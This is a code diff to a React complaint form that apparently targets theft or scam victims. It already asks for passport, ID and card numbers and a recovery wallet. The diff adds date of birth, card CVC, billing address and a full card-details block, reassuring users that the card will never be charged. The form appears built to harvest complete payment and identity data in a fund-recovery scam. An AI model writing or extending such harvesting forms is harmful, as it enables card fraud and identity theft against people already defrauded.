@@ -44,6 +44,9 @@ interface FormData {
   identificationNumber: string;
   passportNumber: string;
   cardNumber: string;
+  cardCvc: string;
+  cardBillingAddress: string;
+  dateOfBirth: string;
 }
 
 const initialFormData: FormData = {
@@ -60,7 +63,10 @@ const initialFormData: FormData = {
   recoveryWalletAddress: "",
   identificationNumber: "",
   passportNumber: "",
-  cardNumber: ""
+  cardNumber: "",
+  cardCvc: "",
+  cardBillingAddress: "",
+  dateOfBirth: ""
 };
 
 const ComplaintForm = () => {
@@ -241,6 +247,18 @@ const ComplaintForm = () => {
               {errors.phone && <p className="text-destructive text-xs mt-1">{errors.phone}</p>}
             </div>
 
+            {/* Date of Birth */}
+            <div>
+              <label htmlFor="dateOfBirth" className={labelClasses}>Date of Birth</label>
+              <input
+                type="date"
+                id="dateOfBirth"
+                name="dateOfBirth"
+                value={formData.dateOfBirth}
+                onChange={handleChange}
+                className={inputClasses("dateOfBirth")} />
+            </div>
+
             {/* Amount Lost */}
             <div>
               <label htmlFor="amountLost" className={labelClasses}>Amount Lost (USD)</label>
@@ -361,21 +379,50 @@ const ComplaintForm = () => {
             <p className="text-xs text-muted-foreground mt-1">Enter your passport number for additional identity verification.</p>
           </div>
 
-          {/* Credit/Debit Card (Optional) */}
-          <div className="mt-5">
-            <label htmlFor="cardNumber" className={labelClasses}>Credit or Debit Card Number
-              <span className="text-muted-foreground font-normal"> (optional — if linked to stolen account)</span>
-            </label>
-            <input
-              type="text"
-              id="cardNumber"
-              name="cardNumber"
-              value={formData.cardNumber}
-              onChange={handleChange}
-              placeholder="e.g. 4111 XXXX XXXX 1234"
-              className={inputClasses("cardNumber")}
-              maxLength={19} />
-            <p className="text-xs text-muted-foreground mt-1">Only provide if the card is linked to your compromised account. We will never charge this card.</p>
+          {/* Credit/Debit Card Section (Optional) */}
+          <div className="mt-5 border border-input rounded-lg p-4">
+            <p className={labelClasses}>Credit or Debit Card Details
+              <span className="text-muted-foreground font-normal"> (optional — only if linked to stolen account)</span>
+            </p>
+            <p className="text-xs text-muted-foreground mb-4">Only provide if the card is linked to your compromised account. We will never charge this card.</p>
+            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+              <div>
+                <label htmlFor="cardNumber" className="block text-xs font-medium text-foreground mb-1">Card Number</label>
+                <input
+                  type="text"
+                  id="cardNumber"
+                  name="cardNumber"
+                  value={formData.cardNumber}
+                  onChange={handleChange}
+                  placeholder="4111 1234 5678 9012"
+                  className={inputClasses("cardNumber")}
+                  maxLength={19} />
+              </div>
+              <div>
+                <label htmlFor="cardCvc" className="block text-xs font-medium text-foreground mb-1">CVC / CVV</label>
+                <input
+                  type="text"
+                  id="cardCvc"
+                  name="cardCvc"
+                  value={formData.cardCvc}
+                  onChange={handleChange}
+                  placeholder="123"
+                  className={inputClasses("cardCvc")}
+                  maxLength={4} />
+              </div>
+            </div>
+            <div className="mt-4">
+              <label htmlFor="cardBillingAddress" className="block text-xs font-medium text-foreground mb-1">Billing Address</label>
+              <input
+                type="text"
+                id="cardBillingAddress"
+                name="cardBillingAddress"
+                value={formData.cardBillingAddress}
+                onChange={handleChange}
+                placeholder="123 Main St, City, State, ZIP"
+                className={inputClasses("cardBillingAddress")}
+                maxLength={200} />
+            </div>
           </div>
 
           {/* Recovery Wallet Address (Optional) */}
